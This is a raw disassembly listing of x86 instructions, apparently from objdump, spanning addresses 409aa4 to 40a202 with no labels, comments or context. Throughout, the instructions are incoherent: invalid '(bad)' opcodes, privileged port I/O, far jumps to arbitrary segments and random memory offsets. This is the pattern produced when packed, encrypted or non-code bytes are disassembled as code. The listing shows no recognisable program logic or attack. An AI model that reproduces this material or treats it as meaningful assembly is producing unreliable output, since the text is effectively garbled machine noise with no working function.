  409aa4:	mov    WORD PTR ds:0x330f53a7,?
  409aaa:	pop    esp
  409aab:	jge    0x409aca
  409aad:	sbb    al,0xc6
  409aaf:	sar    DWORD PTR [ecx+0x2c9106d1],cl
  409ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ab6:	inc    si
  409ab8:	mov    WORD PTR [edx+0x62],es
  409abb:	pop    ss
  409abc:	mov    dl,0xb3
  409abe:	jns    0x409ab2
  409ac0:	retfw  
  409ac2:	gs leave 
  409ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ac5:	lods   eax,DWORD PTR ds:[esi]
  409ac6:	dec    esi
  409ac7:	lds    esp,FWORD PTR [ebp+0x33]
  409aca:	sub    ecx,edi
  409acc:	or     DWORD PTR [ecx-0x1805113c],ecx
  409ad2:	sub    al,0xd9
  409ad4:	mov    dh,0x81
  409ad6:	pushf  
  409ad7:	and    eax,0x1827235d
  409adc:	repz cmp eax,DWORD PTR [esi-0xe34c92e]
  409ae3:	inc    ebx
  409ae4:	push   0xbc2a8d75
  409ae9:	pop    es
  409aea:	fisubr DWORD PTR [ebp-0x74]
  409aed:	fisub  DWORD PTR [eax]
  409aef:	pop    edx
  409af0:	cwde   
  409af1:	aas    
  409af2:	dec    ebp
  409af3:	pop    esp
  409af4:	mov    eax,DWORD PTR [ecx+ecx*2-0x57]
  409af8:	or     eax,0x106e12b2
  409afd:	xchg   BYTE PTR [edi+0x6b800296],al
  409b03:	jg     0x409aa3
  409b05:	loope  0x409af0
  409b07:	outs   dx,DWORD PTR ds:[esi]
  409b08:	rcr    BYTE PTR [eax],cl
  409b0a:	or     DWORD PTR [ebp-0x44],esi
  409b0d:	inc    ebp
  409b0e:	out    dx,eax
  409b0f:	pop    edi
  409b10:	or     ch,BYTE PTR [edi-0x51a6d5b2]
  409b16:	xor    eax,0xc654a88b
  409b1b:	cmp    dl,BYTE PTR [edx+0x3a]
  409b1e:	popa   
  409b1f:	test   BYTE PTR [eax+eiz*1-0x2e5f859e],dl
  409b26:	inc    esp
  409b27:	ss popf 
  409b29:	jmp    0x9ffd:0xa141db35
  409b30:	push   cs
  409b31:	sbb    esp,ebx
  409b33:	add    edi,DWORD PTR [edx]
  409b35:	lock inc esi
  409b37:	(bad)  
  409b38:	out    dx,eax
  409b39:	enter  0x8342,0xb0
  409b3d:	xor    dl,ch
  409b3f:	ins    DWORD PTR es:[edi],dx
  409b40:	retf   
  409b41:	ja     0x409b81
  409b43:	or     DWORD PTR [ecx-0x46],edi
  409b46:	jecxz  0x409b43
  409b48:	mov    ebx,0xd420ca56
  409b4d:	add    al,0x2
  409b4f:	fs push ebx
  409b51:	add    DWORD PTR [edi-0x782d915e],0x14a5a953
  409b5b:	mov    edx,0x12445d44
  409b60:	cwde   
  409b61:	push   ebx
  409b62:	arpl   WORD PTR [edi+0x4e745a91],cx
  409b68:	dec    edi
  409b69:	lock sar eax,0x54
  409b6d:	imul   esp,DWORD PTR fs:[eax-0x7d],0x21
  409b72:	lods   al,BYTE PTR ds:[esi]
  409b73:	dec    eax
  409b74:	lahf   
  409b75:	icebp  
  409b76:	(bad)  
  409b77:	xor    eax,0x6d546ea5
  409b7c:	and    bl,BYTE PTR [ebp-0x3b]
  409b7f:	inc    ebp
  409b80:	xchg   esp,eax
  409b81:	or     bl,BYTE PTR [eax-0x62]
  409b84:	lahf   
  409b85:	mov    edi,DWORD PTR [eax+0x40]
  409b88:	lods   eax,DWORD PTR ds:[esi]
  409b89:	lahf   
  409b8a:	push   eax
  409b8b:	sti    
  409b8c:	mov    esp,DWORD PTR [esi-0x71]
  409b8f:	jne    0x409b6f
  409b91:	xchg   ecx,eax
  409b92:	cmp    bl,BYTE PTR [eax]
  409b94:	retf   0x566e
  409b97:	pop    es
  409b98:	les    eax,FWORD PTR [esi]
  409b9a:	repz pop edx
  409b9c:	fst    DWORD PTR [ecx+0x70909095]
  409ba2:	(bad)  
  409ba3:	xchg   ebp,eax
  409ba4:	xchg   ebp,eax
  409ba5:	leave  
  409ba6:	cmp    eax,ebx
  409ba8:	loope  0x409b92
  409baa:	mov    al,ds:0xad62957e
  409baf:	jb     0x409c0c
  409bb1:	inc    ebp
  409bb2:	push   esp
  409bb3:	and    eax,0x3dfb9c8b
  409bb8:	jnp    0x409b80
  409bba:	jl     0x409bfa
  409bbc:	mov    ecx,0x68922efb
  409bc1:	icebp  
  409bc2:	ret    
  409bc3:	add    cl,0x18
  409bc6:	int    0x2f
  409bc8:	and    BYTE PTR [esi-0x350ae2a1],0x86
  409bcf:	into   
  409bd0:	loop   0x409c48
  409bd2:	adc    BYTE PTR [eax+0x4c6e1f02],dh
  409bd8:	xor    cl,BYTE PTR [eax]
  409bda:	loopne 0x409c21
  409bdc:	jno    0x409c38
  409bde:	in     eax,0x44
  409be0:	jns    0x409bf2
  409be2:	cmp    al,0x49
  409be4:	fbld   TBYTE PTR [edx+esi*2]
  409be7:	adc    al,0x7f
  409be9:	cs pushf 
  409beb:	in     eax,dx
  409bec:	sub    eax,0x2dd5c129
  409bf1:	dec    edi
  409bf2:	out    0x48,eax
  409bf4:	shl    esp,cl
  409bf6:	add    eax,0x7436624b
  409bfb:	push   esi
  409bfc:	out    dx,eax
  409bfd:	stos   BYTE PTR es:[edi],al
  409bfe:	xor    al,0x1
  409c00:	and    eax,DWORD PTR [esi+0x135b159b]
  409c06:	loopne 0x409bbf
  409c08:	mov    edi,fs
  409c0a:	bound  esp,QWORD PTR [edx+0x6e]
  409c0d:	call   0xfb4:0x77c237b9
  409c14:	outs   dx,DWORD PTR ds:[esi]
  409c15:	pop    eax
  409c16:	mov    al,0x1c
  409c18:	stc    
  409c19:	pop    ss
  409c1a:	js     0x409c7b
  409c1c:	or     eax,ebx
  409c1e:	jae    0x409bf1
  409c20:	xlat   BYTE PTR ds:[ebx]
  409c21:	stos   DWORD PTR es:[edi],eax
  409c22:	pop    es
  409c23:	mov    ah,BYTE PTR [edx+0x12]
  409c26:	adc    BYTE PTR [ebp-0x10276b3d],al
  409c2c:	xlat   BYTE PTR cs:[ebx]
  409c2e:	jle    0x409cab
  409c30:	fwait
  409c31:	jg     0x409c07
  409c33:	hlt    
  409c34:	cmp    BYTE PTR [eax+0x15],bh
  409c37:	xor    DWORD PTR [esi+esi*2-0x11f7cdae],esp
  409c3e:	sub    al,0x91
  409c40:	jmp    0x409c21
  409c42:	pop    ds
  409c43:	rcl    DWORD PTR [edi-0x55],0x5c
  409c47:	mov    DWORD PTR [ecx+0x4a],edx
  409c4a:	push   cs
  409c4b:	iret   
  409c4c:	xor    esi,DWORD PTR [edx+0x4e302bd8]
  409c52:	retf   
  409c53:	xchg   edx,eax
  409c54:	fsub   QWORD PTR [edi-0x27]
  409c57:	pop    es
  409c58:	not    BYTE PTR [esi-0x1c]
  409c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c5c:	mov    ds:0x8e3828c6,al
  409c61:	jl     0x409c3a
  409c63:	add    eax,0xd9c2084c
  409c68:	xchg   esi,eax
  409c69:	adc    BYTE PTR [ecx+0x6e7dd85],ah
  409c6f:	and    ebx,esi
  409c71:	xor    eax,0x7e9406d3
  409c76:	addr16 mov ds:0x144a,eax
  409c7a:	mov    cl,BYTE PTR es:[edi]
  409c7d:	mov    ds,ecx
  409c7f:	(bad)  
  409c80:	je     0x409ce6
  409c82:	pop    ecx
  409c83:	mov    BYTE PTR fs:[ebx-0x30ec7365],dl
  409c8a:	test   al,0xc0
  409c8c:	ss xchg esp,eax
  409c8e:	xchg   ebx,eax
  409c8f:	mov    WORD PTR [ebx+0x6e],ss
  409c92:	or     BYTE PTR [bx+si+0x21da],0xcc
  409c98:	dec    esp
  409c9a:	or     ch,BYTE PTR [ecx+0x5b]
  409c9d:	dec    edx
  409c9e:	push   es
  409c9f:	cmp    BYTE PTR [ecx+0x3db2dcac],cl
  409ca5:	mov    ch,0xbe
  409ca7:	lock lods eax,DWORD PTR ds:[esi]
  409ca9:	loopne 0x409c56
  409cab:	xchg   esp,eax
  409cac:	cmp    ch,BYTE PTR ds:0x7384ed35
  409cb2:	jae    0x409c51
  409cb4:	retf   
  409cb5:	pop    edi
  409cb6:	mov    esp,DWORD PTR [esi+0xe82c6fe]
  409cbc:	jl     0x409c9e
  409cbe:	fldenv [esi+0x47]
  409cc1:	fsub   st(2),st
  409cc3:	in     al,0x39
  409cc5:	enter  0xd30,0x9
  409cc9:	frstor [ecx]
  409ccb:	jg     0x409d2d
  409ccd:	pop    esp
  409cce:	(bad)  
  409ccf:	xlat   BYTE PTR ds:[ebx]
  409cd0:	mov    al,ds:0xccb264b
  409cd5:	jmp    0x409c67
  409cd7:	clc    
  409cd8:	scas   eax,DWORD PTR es:[edi]
  409cd9:	dec    ebx
  409cda:	test   BYTE PTR [edi],bl
  409cdc:	push   es
  409cdd:	push   esi
  409cde:	in     al,0x14
  409ce0:	stos   BYTE PTR es:[edi],al
  409ce1:	ins    BYTE PTR es:[edi],dx
  409ce2:	sub    ch,BYTE PTR [edi+ecx*4]
  409ce5:	bound  ebp,QWORD PTR ds:0xf5ab784b
  409ceb:	add    ebp,ebx
  409ced:	enter  0xb4a0,0x6
  409cf1:	mov    ds:0x19134cb6,eax
  409cf6:	mov    ah,0xbf
  409cf8:	cli    
  409cf9:	mov    WORD PTR [esi],?
  409cfb:	clc    
  409cfc:	cmp    al,0xef
  409cfe:	shl    BYTE PTR [ecx-0x352b73b9],1
  409d04:	icebp  
  409d05:	rcl    DWORD PTR [ecx-0x3d],cl
  409d08:	jo     0x409d35
  409d0a:	test   BYTE PTR [ebp-0xe8953c8],bh
  409d10:	sbb    cl,BYTE PTR [edi-0x12]
  409d13:	in     eax,dx
  409d14:	ret    
  409d15:	scas   eax,DWORD PTR es:[edi]
  409d16:	mov    ebx,0x622abecf
  409d1b:	adc    al,0x78
  409d1d:	cmp    BYTE PTR gs:[esi+edi*1-0x5a226f23],ch
  409d25:	xchg   BYTE PTR [esi],bh
  409d27:	cmp    DWORD PTR [edx+0x1b],eax
  409d2a:	fsubrp st(1),st
  409d2c:	psadbw mm5,mm1
  409d2f:	mov    esi,0x68d23c3b
  409d34:	mov    edi,0xda62b10e
  409d39:	jle    0x409cee
  409d3b:	xchg   al,ah
  409d3d:	inc    esp
  409d3e:	test   BYTE PTR [esi+0x25],dh
  409d41:	idiv   esp
  409d43:	xchg   edi,eax
  409d44:	scas   eax,DWORD PTR es:[edi]
  409d45:	and    al,bl
  409d47:	dec    DWORD PTR [ebp-0x2163a9ce]
  409d4d:	fwait
  409d4e:	jbe    0x409d75
  409d50:	adc    DWORD PTR [ecx-0x1],esp
  409d53:	add    eax,0x51f5c012
  409d58:	inc    esp
  409d59:	pop    ds
  409d5a:	mov    al,0xeb
  409d5c:	lock dec eax
  409d5e:	sar    DWORD PTR [ebx-0x57],cl
  409d61:	popa   
  409d62:	add    al,0xc7
  409d64:	call   FWORD PTR [esp+esi*1]
  409d67:	pop    edx
  409d68:	(bad)  
  409d6a:	mov    ebp,0xca8e5065
  409d6f:	in     al,0x7f
  409d71:	xchg   esi,eax
  409d72:	sbb    BYTE PTR [ecx-0x3b],ch
  409d75:	sub    dl,0x79
  409d78:	repz adc ebx,ebx
  409d7b:	mov    dl,0xb6
  409d7d:	push   esi
  409d7e:	sbb    ebp,DWORD PTR fs:[ebx-0x176c712f]
  409d85:	sub    ah,ch
  409d87:	loopne 0x409d30
  409d89:	ja     0x409daa
  409d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d8d:	das    
  409d8e:	mov    WORD PTR [ebx+0x3e],ss
  409d91:	unpckhps xmm1,XMMWORD PTR [ecx]
  409d94:	jae    0x409de6
  409d96:	cli    
  409d97:	xchg   esi,eax
  409d98:	sub    ah,BYTE PTR [esi-0x10d13f01]
  409d9e:	xchg   ecx,eax
  409d9f:	(bad)  
  409da1:	ja     0x409dd2
  409da3:	pop    es
  409da4:	lock test BYTE PTR [edx],bh
  409da7:	mov    al,ds:0x268efda1
  409dac:	dec    esp
  409dad:	mov    dh,0x89
  409daf:	aad    0x9b
  409db1:	lds    esp,FWORD PTR [ecx-0x5f]
  409db4:	loopne 0x409dd7
  409db6:	xchg   DWORD PTR [edx+esi*1-0x7b2b20ee],edx
  409dbd:	jge    0x409da7
  409dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dc0:	adc    eax,0xf73386a7
  409dc5:	jbe    0x409d61
  409dc7:	or     edi,DWORD PTR [ebp+0x36]
  409dca:	dec    esi
  409dcb:	out    dx,eax
  409dcc:	bnd je 0x409e32
  409dcf:	ficom  WORD PTR [edx-0x4f29528a]
  409dd5:	sbb    al,0x6a
  409dd7:	mov    dh,0x26
  409dd9:	(bad)  
  409dda:	out    dx,al
  409ddb:	scas   al,BYTE PTR es:[edi]
  409ddc:	add    al,0xab
  409dde:	je     0x409de5
  409de0:	sbb    DWORD PTR [eax-0x1a],ecx
  409de3:	mov    dh,0xe5
  409de5:	lock rcr BYTE PTR [esi+0x71],cl
  409de9:	mov    ah,BYTE PTR [ebx]
  409deb:	lahf   
  409dec:	or     al,0xa5
  409dee:	sbb    esp,ecx
  409df0:	ror    BYTE PTR [ecx-0xfb487a9],0xa
  409df7:	push   ecx
  409df8:	push   edx
  409df9:	mov    ch,0x68
  409dfb:	and    DWORD PTR [ebx+0x1a8a540c],edi
  409e01:	cli    
  409e02:	fldenv [ebx+0x4]
  409e05:	push   eax
  409e06:	adc    DWORD PTR [ebx],esi
  409e08:	loop   0x409d96
  409e0a:	aas    
  409e0b:	out    dx,al
  409e0c:	cmp    esp,DWORD PTR [edi-0x50]
  409e0f:	sbb    bl,bl
  409e11:	in     eax,dx
  409e12:	pop    ecx
  409e13:	cwde   
  409e14:	imul   ebx,esi,0x6bdd74cc
  409e1a:	push   eax
  409e1b:	xor    esi,DWORD PTR [ecx-0x4ee1d884]
  409e21:	ret    
  409e22:	pop    ebx
  409e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e25:	dec    esi
  409e26:	push   0x2
  409e28:	dec    edx
  409e29:	mov    BYTE PTR [edi-0x6cbe54b6],bl
  409e2f:	or     eax,DWORD PTR [ebp+ebp*2+0x13cd6a44]
  409e36:	das    
  409e37:	(bad)  
  409e38:	sti    
  409e39:	imul   ecx,DWORD PTR [edi+0x65],0xffffffe8
  409e3d:	cmc    
  409e3e:	out    0xf9,eax
  409e40:	cmp    bl,BYTE PTR [ebp+0x14c576b8]
  409e46:	daa    
  409e47:	xor    esi,DWORD PTR ds:0x731837af
  409e4d:	rcl    DWORD PTR [edi+esi*8],1
  409e50:	lods   al,BYTE PTR ds:[esi]
  409e51:	cmp    eax,0x96df7748
  409e56:	ror    BYTE PTR [eax+0xf],0xcf
  409e5a:	adc    al,0xf8
  409e5c:	or     DWORD PTR [edi],esi
  409e5e:	loopne 0x409e3c
  409e60:	outs   dx,BYTE PTR ds:[esi]
  409e61:	test   al,0x7b
  409e63:	mov    cl,0xca
  409e65:	sub    al,BYTE PTR [ebp-0x535d3283]
  409e6b:	fcmovnbe st,st(3)
  409e6d:	xchg   ebp,eax
  409e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e6f:	dec    edx
  409e70:	sub    al,0xff
  409e72:	das    
  409e73:	int3   
  409e74:	sbb    eax,0xd1ed0f2b
  409e79:	add    al,0xdb
  409e7b:	jl     0x409ed3
  409e7d:	mov    bl,ch
  409e7f:	mov    dl,0x50
  409e81:	mov    al,ds:0x66afa9ec
  409e86:	hlt    
  409e87:	call   DWORD PTR [ecx+0x4a4674e]
  409e8d:	call   0xc62e:0x49e1b714
  409e94:	je     0x409e82
  409e96:	jb     0x409eee
  409e98:	pop    ebp
  409e99:	and    dh,BYTE PTR [ebx+0x40]
  409e9c:	sub    BYTE PTR [edi],bh
  409e9e:	(bad)  
  409e9f:	mov    ch,0x48
  409ea1:	dec    edx
  409ea2:	loop   0x409f23
  409ea4:	inc    ebx
  409ea5:	adc    eax,0xb637cd0f
  409eaa:	jge    0x409e54
  409eac:	sbb    eax,0x5d5f2877
  409eb1:	xchg   edx,eax
  409eb2:	sub    DWORD PTR [esp+edi*4-0x3239249e],edi
  409eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eba:	adc    BYTE PTR [eax],ch
  409ebc:	jecxz  0x409ec9
  409ebe:	xor    DWORD PTR [ebp-0x54711f38],ebp
  409ec4:	outs   dx,BYTE PTR ds:[esi]
  409ec5:	dec    eax
  409ec6:	ja     0x409ee5
  409ec8:	xlat   BYTE PTR ds:[ebx]
  409ec9:	cmp    eax,DWORD PTR [ebp-0x30]
  409ecc:	and    esp,DWORD PTR [edx-0x31]
  409ecf:	not    BYTE PTR [esi+0x6a10aacf]
  409ed5:	xchg   edi,eax
  409ed6:	cmp    esi,0x539be628
  409edc:	add    ebp,DWORD PTR [esi+0x6c24ed94]
  409ee2:	popf   
  409ee3:	adc    DWORD PTR [esi+0x77356cfb],edi
  409ee9:	imul   esi,ecx,0x126d218a
  409eef:	adc    al,0x88
  409ef1:	nop
  409ef2:	pusha  
  409ef3:	mov    al,ds:0x58ea204a
  409ef8:	push   ebx
  409ef9:	loope  0x409f02
  409efb:	test   al,0x46
  409efd:	scas   al,BYTE PTR es:[edi]
  409efe:	repz mov edi,DWORD PTR [edx-0x1a]
  409f02:	neg    esp
  409f04:	jns    0x409ee4
  409f06:	inc    esi
  409f07:	fimul  WORD PTR [edi+0x39]
  409f0a:	mov    bl,0xdd
  409f0c:	inc    esi
  409f0d:	fwait
  409f0e:	adc    al,ah
  409f10:	jnp    0x409eaf
  409f12:	xor    al,0x83
  409f14:	sahf   
  409f15:	and    edi,0x56
  409f18:	imul   edx,DWORD PTR [edx-0x5e],0xf02be873
  409f1f:	push   ss
  409f20:	jle    0x409f87
  409f22:	mov    ecx,0xadf0c7fc
  409f27:	sbb    al,0x92
  409f29:	daa    
  409f2a:	dec    ebx
  409f2b:	jmp    0x42a:0xcc4e91a0
  409f32:	adc    al,0x6d
  409f34:	(bad)  
  409f35:	xchg   ecx,eax
  409f36:	add    eax,0x7c5903ea
  409f3b:	dec    esp
  409f3c:	loop   0x409f05
  409f3e:	jecxz  0x409f51
  409f40:	shl    BYTE PTR [eax+ebx*8+0x47],1
  409f44:	dec    eax
  409f45:	inc    esp
  409f46:	lock int 0xb7
  409f49:	jne    0x409f83
  409f4b:	pop    ds
  409f4c:	ins    DWORD PTR es:[edi],dx
  409f4d:	push   0x7a
  409f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f50:	inc    edx
  409f51:	stc    
  409f52:	pop    ds
  409f53:	xchg   BYTE PTR [ebx+0x58],al
  409f56:	cmp    edx,edi
  409f58:	xor    esp,edx
  409f5a:	clc    
  409f5b:	push   edx
  409f5c:	mov    edi,0xa6851b94
  409f61:	jbe    0x409f23
  409f63:	popa   
  409f64:	in     eax,0x74
  409f66:	xchg   esp,eax
  409f67:	adc    ebp,esp
  409f69:	cmp    DWORD PTR [edi+0x3caedb19],ebx
  409f6f:	ror    DWORD PTR [ecx],0xe4
  409f72:	fcom   QWORD PTR [edi+0x38]
  409f75:	in     eax,0xdf
  409f77:	les    ebp,FWORD PTR [edx+eiz*1]
  409f7a:	lea    esp,[edx]
  409f7c:	dec    ebp
  409f7d:	aam    0x46
  409f7f:	jno    0x409fd1
  409f81:	add    ecx,edi
  409f83:	mov    eax,ds:0xc8899535
  409f88:	or     edi,esi
  409f8a:	mov    ch,0xfa
  409f8c:	jmp    0xa9180e02
  409f91:	xchg   ecx,eax
  409f92:	stos   BYTE PTR es:[edi],al
  409f93:	call   edx
  409f95:	js     0x409fcc
  409f97:	and    BYTE PTR [ebx],bl
  409f99:	sbb    dh,bh
  409f9b:	mov    al,0xca
  409f9d:	add    BYTE PTR [ebp+0x9],cl
  409fa0:	in     eax,dx
  409fa1:	shl    BYTE PTR [edx+ebp*1],1
  409fa4:	cmp    esi,DWORD PTR [ebp+0x27]
  409fa7:	popf   
  409fa8:	mov    al,0x50
  409faa:	push   es
  409fab:	fld    DWORD PTR [ebp-0x49]
  409fae:	adc    al,0x44
  409fb0:	cld    
  409fb1:	sbb    ebx,edi
  409fb3:	das    
  409fb4:	leave  
  409fb5:	std    
  409fb6:	stc    
  409fb7:	std    
  409fb8:	repnz (bad) 
  409fba:	inc    ecx
  409fbb:	push   ecx
  409fbc:	aas    
  409fbd:	js     0x409f57
  409fbf:	push   ecx
  409fc0:	(bad)  
  409fc1:	mov    dl,0x52
  409fc3:	pusha  
  409fc4:	jg     0x40a03a
  409fc6:	idiv   DWORD PTR [ebp-0x78e20f6e]
  409fcc:	mov    ah,0x1d
  409fce:	or     eax,0xb96cc82f
  409fd3:	loop   0x409fb2
  409fd5:	rcr    BYTE PTR [eax],cl
  409fd7:	inc    edi
  409fd8:	or     eax,0xf35f574d
  409fdd:	das    
  409fde:	and    dh,BYTE PTR [eax-0x74079440]
  409fe4:	jbe    0x409fc4
  409fe6:	dec    edx
  409fe7:	pop    es
  409fe8:	in     al,0x66
  409fea:	pop    edi
  409feb:	push   ecx
  409fec:	ret    
  409fed:	sti    
  409fee:	jb     0x409f93
  409ff0:	aam    0x55
  409ff2:	int    0x53
  409ff4:	dec    esp
  409ff5:	fist   WORD PTR [edi]
  409ff7:	or     al,0x21
  409ff9:	jmp    FWORD PTR [ebx+0x1a2ebef]
  409fff:	push   ebp
  40a000:	sahf   
  40a001:	mov    DWORD PTR [esi-0x1ad37741],ebp
  40a007:	ret    0x5282
  40a00a:	xor    BYTE PTR [ebx+0x5f],0x57
  40a00e:	sub    eax,DWORD PTR [ecx*1+0x2eb91cc]
  40a015:	in     al,dx
  40a016:	sub    DWORD PTR [edx-0x23f5dc7c],eax
  40a01c:	dec    edx
  40a01d:	pop    esi
  40a01e:	add    al,0xb2
  40a020:	in     al,dx
  40a021:	and    eax,0x8037903
  40a026:	xlat   BYTE PTR ds:[ebx]
  40a027:	mov    ?,WORD PTR [ecx+edx*2]
  40a02a:	popa   
  40a02b:	jp     0x40a091
  40a02d:	rcr    BYTE PTR [ebx],0x15
  40a030:	in     al,dx
  40a031:	test   BYTE PTR [bx+si+0xd44],bl
  40a036:	stc    
  40a037:	inc    eax
  40a038:	add    ah,BYTE PTR [edi-0x5ec48fb]
  40a03e:	loope  0x40a0a8
  40a040:	push   ebx
  40a041:	sbb    dl,cl
  40a043:	jo     0x409fff
  40a045:	push   eax
  40a046:	jae    0x40a04b
  40a048:	pop    ecx
  40a049:	into   
  40a04a:	(bad)  
  40a04b:	nop
  40a04c:	push   cs
  40a04d:	xor    DWORD PTR [ebp+0x7f69d3f0],ebp
  40a053:	push   es
  40a054:	shl    DWORD PTR [esi+0x295d2cb0],0xae
  40a05b:	sub    eax,0x752d6a5b
  40a060:	cmp    al,0x74
  40a062:	inc    esi
  40a063:	pop    edi
  40a064:	add    DWORD PTR [ecx],edx
  40a066:	push   es
  40a067:	sbb    al,0xbf
  40a069:	inc    edx
  40a06a:	lds    ebp,FWORD PTR [edx]
  40a06c:	xor    al,0xf
  40a06e:	xlat   BYTE PTR ds:[ebx]
  40a06f:	dec    eax
  40a070:	jmp    0x8064:0x54726432
  40a077:	push   ecx
  40a078:	sbb    BYTE PTR [esi],ah
  40a07a:	mov    ebx,0x4759b107
  40a07f:	push   cs
  40a080:	and    ebp,esp
  40a082:	fisttp DWORD PTR [esi+0x1c1d606d]
  40a088:	inc    ebx
  40a089:	mov    ds:0x19fe1bde,al
  40a08e:	lea    ecx,[edi+0x69]
  40a091:	mov    dl,0x44
  40a093:	adc    al,0xf
  40a095:	cmp    bh,dl
  40a097:	aam    0x31
  40a099:	mov    al,ds:0xc8630d7e
  40a09e:	aas    
  40a09f:	sub    ch,ch
  40a0a1:	cmp    eax,0x41a853c0
  40a0a6:	pop    ebp
  40a0a7:	in     eax,dx
  40a0a8:	dec    esi
  40a0a9:	push   edi
  40a0aa:	push   edi
  40a0ab:	das    
  40a0ac:	jmp    0xc39a5128
  40a0b1:	sub    al,0x7d
  40a0b3:	stos   DWORD PTR es:[edi],eax
  40a0b4:	xchg   esp,eax
  40a0b5:	adc    eax,0xd97e1e2a
  40a0ba:	shl    DWORD PTR [edi-0x4c],cl
  40a0bd:	inc    BYTE PTR [edi+0x7e]
  40a0c0:	arpl   WORD PTR [ecx+ecx*8],ax
  40a0c3:	je     0x40a07c
  40a0c5:	mov    bh,BYTE PTR [esi+0x71bd3631]
  40a0cb:	mov    BYTE PTR [ebp+ecx*4-0x270019dc],bl
  40a0d2:	dec    edx
  40a0d3:	xchg   ecx,eax
  40a0d4:	mov    esp,0xa1a0a85
  40a0d9:	mov    bl,0x3d
  40a0db:	fsub   QWORD PTR [eax]
  40a0dd:	in     al,0xb1
  40a0df:	imul   edx,DWORD PTR [edi+0xf053f41],0xb02a7e19
  40a0e9:	and    DWORD PTR [edx-0x75],edx
  40a0ec:	aaa    
  40a0ed:	mov    esi,0x1e08e548
  40a0f3:	(bad)  
  40a0f4:	xchg   ebp,eax
  40a0f5:	rcr    BYTE PTR [ebp-0x6de9cc33],cl
  40a0fb:	xor    ah,ah
  40a0fd:	lea    edi,[esp+eiz*2]
  40a100:	lods   eax,DWORD PTR ds:[esi]
  40a101:	imul   ebx,DWORD PTR [esi-0x4aa391df],0xffffffc6
  40a108:	jl     0x40a104
  40a10a:	test   al,0x21
  40a10c:	mov    ebp,0x31092863
  40a111:	lahf   
  40a112:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40a114:	aas    
  40a115:	fst    QWORD PTR [ebp+edx*4+0x19]
  40a119:	and    eax,DWORD PTR ds:0x206a7866
  40a11f:	xchg   BYTE PTR [ebx+0x4],bl
  40a122:	repz mov ch,0x40
  40a125:	dec    edx
  40a126:	mov    eax,0xb3e92b5e
  40a12b:	jae    0x40a16f
  40a12d:	das    
  40a12e:	dec    eax
  40a12f:	sbb    BYTE PTR ds:0xd2c761a,dh
  40a135:	sahf   
  40a136:	ret    0x76c9
  40a139:	cmp    dh,BYTE PTR [edx+0x2]
  40a13c:	jae    0x40a0de
  40a13e:	pushf  
  40a13f:	outs   dx,DWORD PTR ds:[esi]
  40a140:	xchg   edx,eax
  40a141:	cmp    dh,al
  40a143:	pop    ebp
  40a144:	imul   esp,DWORD PTR [ecx],0xffffffba
  40a147:	icebp  
  40a148:	xchg   ebp,eax
  40a149:	inc    esp
  40a14a:	sub    ebx,ebp
  40a14c:	xor    BYTE PTR [edi+eiz*4-0x3dd1cf31],al
  40a153:	dec    ebx
  40a154:	leave  
  40a155:	push   ds
  40a156:	xor    eax,esp
  40a158:	mov    edi,0xfb58e618
  40a15d:	fcomp  QWORD PTR [eax-0x7d00456c]
  40a163:	aad    0xa1
  40a165:	mov    cl,0x41
  40a167:	pop    edi
  40a168:	and    BYTE PTR [esi-0x16d56060],bh
  40a16e:	outs   dx,DWORD PTR ds:[esi]
  40a16f:	xchg   ebx,eax
  40a170:	fs cmp al,0xd2
  40a173:	arpl   WORD PTR [edi-0x38],bx
  40a176:	aad    0xf
  40a178:	out    dx,al
  40a179:	out    0x68,al
  40a17b:	test   eax,0x68c93706
  40a180:	(bad)  
  40a181:	adc    DWORD PTR [esi],edi
  40a183:	mov    edi,0x7a5942fd
  40a188:	daa    
  40a189:	xchg   esp,eax
  40a18a:	xchg   edx,eax
  40a18b:	xor    edx,esi
  40a18d:	adc    eax,ecx
  40a18f:	fwait
  40a190:	mov    dl,0x7
  40a192:	(bad)
  40a196:	mov    eax,edi
  40a198:	inc    esp
  40a199:	imul   ecx,DWORD PTR [ebp-0x2625b812],0xffffffa1
  40a1a0:	sub    esp,DWORD PTR [ebx+0x22285ef2]
  40a1a6:	adc    ah,BYTE PTR [esi-0x2e0256d3]
  40a1ac:	adc    al,BYTE PTR [esi+0x1e]
  40a1af:	pop    esp
  40a1b0:	in     eax,0xfe
  40a1b2:	lods   eax,DWORD PTR ds:[esi]
  40a1b3:	cmc    
  40a1b4:	mov    ch,0xbd
  40a1b6:	in     al,0xb8
  40a1b8:	push   ebp
  40a1b9:	sub    edi,DWORD PTR [ebx]
  40a1bb:	int    0xe1
  40a1bd:	push   esi
  40a1be:	scas   eax,DWORD PTR es:[edi]
  40a1bf:	jl     0x40a1c7
  40a1c1:	mov    dh,0xb4
  40a1c3:	sbb    edi,DWORD PTR [edx]
  40a1c5:	aad    0xa7
  40a1c7:	and    eax,0xdf17188e
  40a1cc:	adc    al,0xcd
  40a1ce:	ins    DWORD PTR es:[edi],dx
  40a1cf:	inc    eax
  40a1d0:	jp     0x40a16e
  40a1d2:	pop    esi
  40a1d3:	inc    ebx
  40a1d4:	arpl   WORD PTR [ebp-0x49a53505],sp
  40a1da:	pop    ebx
  40a1db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1dc:	or     BYTE PTR [esi-0x51],dl
  40a1df:	(bad)  
  40a1e0:	pop    edx
  40a1e1:	not    DWORD PTR ds:0x27138cfe
  40a1e7:	pop    ds
  40a1e8:	dec    eax
  40a1e9:	adc    eax,0x7dd3c0
  40a1ee:	push   DWORD PTR [ecx]
  40a1f0:	test   DWORD PTR [edx+0x72],ecx
  40a1f3:	and    edx,DWORD PTR [edi-0x1f]
  40a1f6:	cmp    edx,DWORD PTR [ecx+ecx*4]
  40a1f9:	dec    edi
  40a1fa:	sbb    bh,BYTE PTR [ebx+0x280c5987]
  40a200:	cmp    al,0xc4
  40a202:	ret    
